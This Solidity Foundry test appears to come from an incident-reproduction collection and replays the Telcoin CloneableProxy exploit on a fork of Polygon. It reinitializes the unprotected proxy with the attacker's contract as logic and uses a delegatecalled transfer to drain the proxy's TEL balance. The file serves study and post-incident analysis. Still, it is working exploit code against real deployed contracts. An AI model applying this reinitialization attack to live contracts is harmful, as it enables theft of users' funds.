// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~1,24M
// Attacker : https://polygonscan.com/address/0xdb4b84f0e601e40a02b54497f26e03ef33f3a5b7
// Vulnerable Contract : https://polygonscan.com/address/0x56bcadff30680ebb540a84d75c182a5dc61981c0
// Attack Tx (CloneableProxy#1) : https://phalcon.blocksec.com/explorer/tx/polygon/0x35f50851c3b754b4565dc3e69af8f9bdb6555edecc84cf0badf8c1e8141d902d

// @Analysis
// https://blocksec.com/phalcon/blog/telcoin-security-incident-in-depth-analysis
// https://hacked.slowmist.io/?c=&page=2

interface ICloneableProxy {
    function initialize(address _logic, bytes memory data) external;
}

contract ContractTest is Test {
    // CloneableProxy#1 created and 'initialized' at tx:
    // https://phalcon.blocksec.com/explorer/tx/polygon/0x1a31cb6f417d30fe8769328b3412bfb0d70247a82009ef28dfab5730c82acd05
    ICloneableProxy private constant CloneableProxy =
        ICloneableProxy(0x56BCADff30680EBB540a84D75c182A5dC61981C0);
    IERC20 private constant TEL =
        IERC20(0xdF7837DE1F2Fa4631D716CF2502f8b230F1dcc32);

    function setUp() public {
        vm.createSelectFork("polygon", 51546495);
        vm.label(address(CloneableProxy), "CloneableProxy#1");
        vm.label(address(TEL), "TEL");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Attacker TEL balance before exploit",
            TEL.balanceOf(address(this)),
            TEL.decimals()
        );
        bytes32 cloneableProxyPackedSlot0 = vm.load(
            address(CloneableProxy),
            bytes32(uint256(0))
        );
        console.log(
            "----------------------------------------------------------------"
        );
        emit log_named_bytes32(
            "CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization",
            cloneableProxyPackedSlot0
        );
        console.log(
            "----------------------------------------------------------------"
        );
        console.log(
            "CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization (two least significant bytes): uint8 _initializing: %s, bool _initialized: %s",
            uint8(cloneableProxyPackedSlot0[30]),
            uint8(cloneableProxyPackedSlot0[31])
        );
        console.log(
            "----------------------------------------------------------------"
        );
        console.log("---Exploit Time---");

        bytes memory data = abi.encodePacked(
            this.transferTELFromCloneableProxy.selector
        );
        CloneableProxy.initialize(address(this), data);

        cloneableProxyPackedSlot0 = vm.load(
            address(CloneableProxy),
            bytes32(uint256(0))
        );
        console.log(
            "----------------------------------------------------------------"
        );
        emit log_named_bytes32(
            "CloneableProxy#1 storage packed slot 0 contents after exploit and reinitialization",
            cloneableProxyPackedSlot0
        );
        console.log(
            "----------------------------------------------------------------"
        );
        console.log(
            "CloneableProxy#1 storage packed slot 0 contents after exploit and reinitialization (two least significant bytes): uint8 _initializing: %s, bool _initialized: %s",
            uint8(cloneableProxyPackedSlot0[30]),
            uint8(cloneableProxyPackedSlot0[31])
        );
        console.log(
            "----------------------------------------------------------------"
        );
        emit log_named_decimal_uint(
            "Attacker TEL balance after exploit",
            TEL.balanceOf(address(this)),
            TEL.decimals()
        );

        // Sanity test after exploit
        vm.expectRevert("Initializable: contract is already initialized");
        CloneableProxy.initialize(address(this), "");
    }

    function implementation() external view returns (address) {
        return address(this);
    }

    // Function will be delegatecalled from CloneableProxy#1
    // Transfer only TEL because victim proxy doesn't have LINK balance
    function transferTELFromCloneableProxy() external {
        TEL.transfer(msg.sender, TEL.balanceOf(address(CloneableProxy)));
    }
}
